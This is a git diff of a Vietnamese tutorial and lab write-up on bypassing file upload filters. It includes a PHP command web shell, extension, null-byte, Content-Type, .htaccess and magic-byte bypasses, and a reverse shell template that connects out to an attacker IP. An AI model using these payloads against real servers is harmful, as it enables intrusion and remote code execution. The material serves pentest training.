@@ -23,29 +23,26 @@ Lưu ý: Luôn cần tải lên một tệp chuẩn định dạng theo yêu c�
 <a id="p3"></a>
 ## 3 Kỹ thuật upload backdoor
 ### 3.1 Bypass file extension: <br>
+
 Cho phép upload đuôi `jpg, png, gif` và chặn các đuôi là `php`  => có thể bypass và upload đc file shell  `shell.jpg.php`  <br>
 Bypass đuôi file: <br>
-Lab: Chiếm quyền điều khiển server và đọc một tập tin bí mật ở thư mục gốc (đường dẫn /) để chứng minh bạn đã khai thác thành công
-<<<<<<< HEAD
-![alt text](../src/image.png)
-=======
-![alt text](./src/image.png)
->>>>>>> 1ef2a05613deed256711c87b616087b892f09f20
-Tiến hành upload 1 file shell là `cmd.php` => Bị lỗi Hack detected
+Lab: Chiếm quyền điều khiển server và đọc một tập tin bí mật ở thư mục gốc (đường dẫn /) để chứng minh bạn đã khai thác thành công <br>
+![alt text](./src/image.png) <br>
+Tiến hành upload 1 file shell là `cmd.php` => Bị lỗi Hack detected <br>
 ![alt text](./src/image-1.png) <br>
-Xem source thì thấy rằng nếu check thấy extension là php => báo lỗi
+Xem source thì thấy rằng nếu check thấy extension là php => báo lỗi <br>
 ![alt text](./src/image-2.png) <br>
 Bypass bằng cách thêm 1 extension vào tên file: `cmd.abc.php?` vì đoạn code đang chỉ kiểm tra phần tử đầu tiên sau dấu `.` nên extension sẽ là `.abc` <br>
-Upload file shell `cmd.abc.php`
+Upload file shell `cmd.abc.php` <br>
 ```
 <?php system($_GET['cmd']); ?>
 ```
-Upload thành công và dùng lệnh `?cmd=ls /` để đọc các thư mục ở `/`
-![alt text](./src/image-3.png)
+Upload thành công và dùng lệnh `?cmd=ls /` để đọc các thư mục ở `/` <br>
+![alt text](./src/image-3.png) <br>
 ![alt text](./src/image-4.png)
 ### 3.2 Bypass đuôi file: <br>
-Nếu file extension bao gồm `php, php3, php4, php5, phtml` => bị từ chối.
-Có thể bypass bằng cách đặt tên tệp là `shell.phphpp`
+Nếu file extension bao gồm `php, php3, php4, php5, phtml` => bị từ chối. <br>
+Có thể bypass bằng cách đặt tên tệp là `shell.phphpp` <br>
 ### 3.3 Bypass dùng NULL byte khi phía Back-end luôn thêm đuôi file hợp lệ: <br>
 ```
 function add_valid_extension($filename, $valid_extension) {
@@ -58,36 +55,35 @@ $filename_with_extension = add_valid_extension($filename, $valid_extension);
 ```
 =>Ta có thể bypass bằng cách đặt tên tệp `shell.php%00`
 ### 3.4 Bypass Content-type
-Vì Content-Type là một header trong HTTP request nên ta có thể dễ
-dàng thay đổi giá tr của nó bằng Burp Suite.
+Vì Content-Type là một header trong HTTP request nên ta có thể dễ dàng thay đổi giá tr của nó bằng Burp Suite. <br>
 ![alt text](./src/image-5.png) <br>
-Ban đầu khi up 1 file php thì dạng Content-Type :`application/octet-stream` và nó không nằm trong các content type được cho phép upload:
-![alt text](./src/image-6.png)
-=> Upload một file php và đổi Content-Type thành `./src/image/jpeg` và thành công upload shell
-![alt text](./src/image-7.png)
+Ban đầu khi up 1 file php thì dạng Content-Type :`application/octet-stream` và nó không nằm trong các content type được cho phép upload: <br>
+![alt text](./src/image-6.png) <br>
+=> Upload một file php và đổi Content-Type thành `./src/image/jpeg` và thành công upload shell <br>
+![alt text](./src/image-7.png) <br>
 ### 3.5 Bypass Extension với Web Server Apache
-Upload file `.htaccess với content` là AddType `application/x-httpdphp .txt` sẽ cho phép chạy .txt như code
+Upload file `.htaccess với content` là AddType `application/x-httpdphp .txt` sẽ cho phép chạy .txt như code <br>
 Upload file txt và chạy code PHP <br>
-B1: Upload .htaccess
+B1: Upload .htaccess <br>
 ```
 <FilesMatch ".+\.tam$">
     SetHandler application/x-httpd-php
 </FilesMatch>
 ```
 ![alt text](./src/image-8.png)
-B2: Upload shell .tam và chạy php bình thường
-![alt text](./src/image-9.png)
-![alt text](./src/image-10.png)
+B2: Upload shell .tam và chạy php bình thường <br>
+![alt text](./src/image-9.png) <br>
+![alt text](./src/image-10.png) <br>
 ### 3.6  Bypass File header(Magic byte)
 ![alt text](./src/image-11.png)
-Upload file với nội dung có dạng: <magic_bytes><php_code>
-Ví dụ: `GIF89a;<?php system($_GET['cmd']); ?>`
-![alt text](./src/image-13.png)
-![alt text](./src/image-14.png)
+Upload file với nội dung có dạng: <magic_bytes><php_code> <br>
+Ví dụ: `GIF89a;<?php system($_GET['cmd']); ?>` <br>
+![alt text](./src/image-13.png) <br>
+![alt text](./src/image-14.png) <br>
 <a id="p4"></a>
 ## 4. Upload backdoor nâng cao
 ### 4.1 PentestMonkey PHP Reverse Shell
-Có thể update file shell sau
+Có thể update file shell sau <br>
 ```
 <?php
 $ip = 'YOUR_IP';
@@ -96,9 +92,9 @@ $socket = fsockopen($ip, $port);
 exec('/bin/sh -i <&3 >&3 2>&3');
 ?>
 ```
-Và dùng nc để kết nối `nc -lvnp PORT`
+Và dùng nc để kết nối `nc -lvnp PORT` <br>
 ### 4.2 Upload backdoor với Obfuscation
-Mã hóa nguồn backdoor
+Mã hóa nguồn backdoor <br>
 ```
 <?php
                                                                                                                                                                                 
@@ -106,11 +102,11 @@ Mã hóa nguồn backdoor
 ```
 <a id="p5"></a>
 ## 5 WriteUp Lab Vuln 
-![alt text](./src/image-15.png)
+![alt text](./src/image-15.png) <br>
 ### 5.1 Unrestricted
 ![alt text](./src/image-16.png)
-Trang web chỉ cho phép upload file có format sau : `gif, jpg, jpeg, png`
-Nhưng check source code thì thấy
+Trang web chỉ cho phép upload file có format sau : `gif, jpg, jpeg, png` <br>
+Nhưng check source code thì thấy <br>
 ```
 <?php
     require("../../../lang/lang.php");
@@ -143,45 +139,45 @@ Nhưng check source code thì thấy
 
 ?>
 ```
-```$fileName = $_FILES['input_./src/image']['name'];``` : Tên tệp mà người dùng tải lên được lấy trực tiếp mà không kiểm tra.
+```$fileName = $_FILES['input_./src/image']['name'];``` : Tên tệp mà người dùng tải lên được lấy trực tiếp mà không kiểm tra. <br>
 Vậy có nghĩa chúng ta có thể up 1 file shell.php. <br>
-`move_uploaded_file($tmpName, $uploadPath);`: Hàm này di chuyển tệp từ thư mục tạm sang thư mục đích (ở đây là uploads/). Và chúng ta up file `.php` thì sẽ có thẻ RCE được trên server
-Upload thành công
-![alt text](./src/image-17.png)
-Truy cập `URL + /uploads/cmd.php` và RCE thành công
+`move_uploaded_file($tmpName, $uploadPath);`: Hàm này di chuyển tệp từ thư mục tạm sang thư mục đích (ở đây là uploads/). Và chúng ta up file `.php` thì sẽ có thẻ RCE được trên server <br>
+Upload thành công <br>
+![alt text](./src/image-17.png) <br>
+Truy cập `URL + /uploads/cmd.php` và RCE thành công <br>
 ![alt text](./src/image-18.png)
 ![alt text](./src/image-19.png)
 ### 5.2 : MIME Type
-Tương tự như 5.1 nhưng lần này anh dev đã thêm check MIME type để ngăn chặn việc upload các file nguy hiểm
+Tương tự như 5.1 nhưng lần này anh dev đã thêm check MIME type để ngăn chặn việc upload các file nguy hiểm <br>
 ![alt text](./src/image-21.png)
-`$_FILES['input_./src/image']['type']` đã kiểm tra loại tệp dựa trên MIME type nhưng vẫn có thể bypass bằng cách đổi MINE type ở hear HTTP
+`$_FILES['input_./src/image']['type']` đã kiểm tra loại tệp dựa trên MIME type nhưng vẫn có thể bypass bằng cách đổi MINE type ở hear HTTP <br>
 ![alt text](./src/image-22.png)
-Upload thành công và RCE được server
+Upload thành công và RCE được server <br>
 ![alt text](./src/image-23.png)
 ### 5.3 Magic Header
-Ở level này đã thêm việc sử dụng `mime_content_type()` để kiểm tra loại tệp dựa trên MIME type thực sự.
+Ở level này đã thêm việc sử dụng `mime_content_type()` để kiểm tra loại tệp dựa trên MIME type thực sự. <br>
 ![alt text](./src/image-24.png)
-Bypass :
-`GIF89a;+ <shell php>` =>Upload thành công => RCE được server
+Bypass : <br>
+`GIF89a;+ <shell php>` =>Upload thành công => RCE được server <br>
 ![alt text](./src/image-28.png)
 ![alt text](./src/image-29.png)
 ### 5.4 Blacklist - 1
-Ở level này thì đoạn code đã
+Ở level này thì đoạn code đã <br>
 ![alt text](./src/image-26.png)
 `pathinfo($fileName)['extension']` lấy đuôi tệp và kiểm tra trong danh sách blacklist không cụ thể là `php` <br>
 `if( !in_array($fileExt,$extensions) && trim($fileName) != ".htaccess")` : kiểm tra đuôi tệp ($fileExt) có nằm trong mảng $extensions hay không. <br>
-`trim($fileName) != ".htaccess"` : ngăn chặn người dùng tải lên tệp .htaccess
-=> Chúng ta có thể up các file khác mà mod php có thể xử lý được như `php3, php4, php5, phtml`
+`trim($fileName) != ".htaccess"` : ngăn chặn người dùng tải lên tệp .htaccess <br>
+=> Chúng ta có thể up các file khác mà mod php có thể xử lý được như `php3, php4, php5, phtml` <br>
 ![alt text](./src/image-31.png)
 ![alt text](./src/image-32.png)
 ### 5.5 Blacklist - 2
-Ở level này dường như đã chặn hết các đuôi file mà mod php có thể xử lý
+Ở level này dường như đã chặn hết các đuôi file mà mod php có thể xử lý <br>
 ![alt text](./src/image-33.png)
-Vậy liệu mod php còn xử lý file nào nữa không
-Và cũng có thể tạo ra đuôi file mà chúng ta muốn với .htaccess
+Vậy liệu mod php còn xử lý file nào nữa không <br>
+Và cũng có thể tạo ra đuôi file mà chúng ta muốn với .htaccess <br>
 ![alt text](./src/image-34.png)
-Chúng ta upload thành công và có thể cho phép chạy .tam như code PHP và RCE thành công
-![alt text](./src/image-35.png)
+Chúng ta upload thành công và có thể cho phép chạy .tam như code PHP và RCE thành công <br>
+![alt text](./src/image-35.png) 
 ![alt text](./src/image-36.png)
 
 
